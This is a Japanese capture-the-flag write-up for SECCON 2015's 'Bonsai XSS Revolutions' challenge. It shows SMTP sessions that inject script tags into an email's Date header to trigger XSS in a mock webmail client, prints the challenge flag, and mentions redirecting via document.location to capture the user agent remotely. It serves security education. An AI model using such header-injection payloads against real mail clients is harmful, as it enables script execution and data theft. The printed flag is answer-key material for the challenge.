@@ -1,0 +1,94 @@
+Bonsai XSS Revolutions
+
+Bonsai XSS RevolutionsはWeb/Networkカテゴリの200点問題として出題され、次のような問題文と「hakoniwaWebMail_20151124.zip」というファイルがあった。
+
+
+What is your browser(User-Agent)?
+Requirement:.NET Framework 4.5
+
+---
+
+ブラウザの名称(User-Agent)を答えよ。
+必要環境.NET Framework 4.5
+
+
+問題ファイルのダウンロード
+https://book.mynavi.jp/files/user/support/9784839962135/mondai11.zip
+
+問題ファイルの中には「hakoniwaWebMail.exe」というファイルが1つあるだけで、パスワードもかかっていないZIPファイルとなっている。
+ファイルを展開し、hakoniwaWebMail.exeを実行してみる。
+実行すると、Widowsのような何かの画面が表示され、画面が自動的に変わっていく。そして最終的にWebメールの閲覧画面のようになる。画面をクリックしても「You can NOT operate anything.」と表示され操作することはできない。
+
+二重実行すると何らかのポートで待ち受けていることがわかるエラーメッセージが表示される。
+調べてみると、25/tcpで待ち受けていることがわかる。
+
+C:\>tasklist | find hakoniwaWebMail.exe
+C:\>netstat -ano | find "17152"
+
+25番ポートに接続するとメールサーバが動いているため、試しにメールを送ってみる。
+
+
+telet localhost:25
+HELO mail.example.com
+MAIL FROM: hoge@mail.example.com
+RCPT TO: keigo.yamazaki@tsuribori.test
+DATA
+Date: 2016/11/27 02:25
+From: hoge@mail.example.com
+To: keigo.yamazaki@tsuribori.test
+Subject: Test Mail
+
+Test Mail
+.
+QUIT
+
+宛先のメールアドレスについては、「hakoniwaWebMail.exe」を起動してからしばらく見ていると表示されるタイミングがあるため、それを使う。
+
+SMTPでのやりとりのあと、「hakoniwaWebMail.exe」の画面を見てみると、送ったメールが表示されている。ここから攻めていく。
+
+
+問題は、今回求められているユーザエージェントを、どのように入手するかということ。URLを含むメールを受信した際に、そのURLへ自動的にアクセスが行われ、ユーザエージェントを知ることができるのではとも考えられるが、それは外れ。
+
+XSSなメールを送ってみる。
+文字列を挿入できる項目が、件名、送信元、宛先、日付、本文と5つあるので順に試していく。そして、日付のところでXSSできることが分かる。
+
+
+HELO mail.example.com
+MAIL FROM: hoge@mail.example.com
+RCPT TO: keigo.yamazaki@tsuribori.test
+DATA
+Date: 2016/11/27 02:27<script>alert(1);</script>
+From: hoge@mail.example.com
+To: keigo.yamazaki@tsuribori.test
+Subject: Test Mail
+
+Test Mail
+.
+QUIT
+
+
+日付部分にalert(1)を挿入する。
+実際にユーザエージェントを表示するスクリプトを送ってみる。
+ユーザエージェントを表示するには「window.navigator.userAgent」を表示させればよい。
+
+
+HELO mail.example.com
+MAIL FROM: hoge@mail.example.com
+RCPT TO: keigo.yamazaki@tsuribori.test
+DATA
+Date: 2016/11/27 02:27<script>alert(window.navigator.userAgent);</script>
+From: hoge@mail.example.com
+To: keigo.yamazaki@tsuribori.test
+Subject: Test Mail
+
+Test Mail
+.
+QUIT
+
+
+メール送信後にhakoniwaWebMail.exeへ戻ると、ダイアログでユーザエージェントが表示されており、フラグは「SECCON{TsuriboriWebBros/2015.12.17620}」であることがわかる。
+
+
+別解
+XSSでダイアログを表示させる代わりに、document.locationでページ遷移させることにより、待ち受け側でユーザエージェント(=フラグ)を入手することもできる。
+
